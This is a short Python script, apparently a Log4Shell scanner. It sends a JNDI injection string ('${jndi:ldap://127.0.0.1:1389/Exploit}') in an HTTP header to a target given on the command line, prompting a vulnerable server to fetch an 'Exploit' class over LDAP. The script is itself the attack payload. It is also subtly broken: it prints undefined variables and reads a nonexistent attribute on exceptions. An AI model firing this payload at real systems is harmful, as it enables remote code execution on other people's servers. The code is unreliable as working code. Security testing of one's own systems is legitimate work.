#!/bin/python3
# log4shell_scanner.py <http(s)://ip_or_hostname[:port]>

import sys
import requests

vuln_webserver = sys.argv[1]

s = requests.Session()
s.headers = {'X-Api-Version': '${jndi:ldap://127.0.0.1:1389/Exploit}'}
try:
    print(f"probing {rhost}:{p}...")
    r = s.get(f"{vuln_webserver}", verify=False, timeout=1)
    print(r.text)
except Exception as e:
    print (e.text)

s.close()